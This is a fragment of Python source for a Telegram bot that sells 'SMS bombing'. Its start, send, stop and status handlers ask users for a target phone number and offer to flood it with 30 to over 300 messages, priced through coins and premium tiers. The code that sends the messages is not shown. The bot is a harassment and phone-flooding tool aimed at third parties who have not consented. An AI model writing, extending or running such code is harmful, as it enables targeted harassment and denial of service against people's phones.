# ===== HANDLERS =====

async def start_cmd(update, context):
    user = update.effective_user
    uid = user.id
    username = f"@{user.username}" if user.username else user.first_name
    
    get_user(uid)
    update_user(uid, {"username": user.username or "", "first_name": user.first_name or ""})
    
    u = get_user(uid)
    if u.get("banned"):
        await update.message.reply_text("🚫 **You are banned!** Contact admin.")
        return
    
    bonus_status = "✅ Claim Now!" if can_claim_bonus(uid) else "✅ Claimed Today"
    tier = "🆓 Free" if u["tier"] == "free" else f"💎 Premium"
    
    text = f"""
╔══════════════════════════════════════╗
║        {BOT_NAME}            ║
╚══════════════════════════════════════╝

🔥 **Welcome {username}!** 🔥
🤖 {BOT_MADE_BY}

━━━━━━━━━━━━━━━━━━━━━━

**✨ YOUR STATS:**
🆔 ID: `{uid}`
🎚 Tier: {tier}
🪙 Coins: {u.get('coins', 0)}
🎁 Daily Bonus: {bonus_status}
📦 Total Bombs: {u.get('total_bombs', 0)}

━━━━━━━━━━━━━━━━━━━━━━

**📌 SMS INTENSITY:**
🔋 **Low** — 30+ SMS (10 coins / Free)
⚡ **Medium** — 90+ SMS (💎 Premium)
🔥 **High** — 150+ SMS (💎 Premium)
💀 **Extreme** — 300+ SMS (💎 Premium)

━━━━━━━━━━━━━━━━━━━━━━

🎁 Daily bonus = 10 coins → 1 Low SMS free!
💎 Premium = Unlimited SMS (no coins needed)
👤 Contact: {ADMIN_USERNAME}
🤖 {BOT_MADE_BY}
    """
    
    await update.message.reply_text(text, reply_markup=main_menu(), parse_mode="Markdown")

async def send_cmd(update, context):
    uid = update.effective_user.id
    u = get_user(uid)
    if u.get("banned"):
        await update.message.reply_text("🚫 You are banned!")
        return
    
    await update.message.reply_text(
        "📱 **Send target phone number:**\n\n"
        "Example: `01712345678`\n"
        "Or: `+8801712345678`",
        parse_mode="Markdown"
    )
    user_states[uid] = {"state": "number"}

async def stop_cmd(update, context):
    uid = update.effective_user.id
    if uid in active_bombers and active_bombers[uid] and active_bombers[uid].running:
        active_bombers[uid].stop()
        active_bombers[uid] = None
        await update.message.reply_text("🛑 **Bombing stopped!**", reply_markup=main_menu())
    else:
        await update.message.reply_text("❌ No active bombing.", reply_markup=main_menu())

async def status_cmd(update, context):
    uid = update.effective_user.id
    if uid in active_bombers and active_bombers[uid] and active_bombers[uid].running:
        b = active_bombers[uid]
        await update.message.reply_text(
            f"📊 **Live Status:**\n✅ Sent: {b.stats['sent']}\n❌ Failed: {b.stats['failed']}\n📦 Total: {b.stats['total']}",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("📊 No active session.", reply_markup=main_menu())

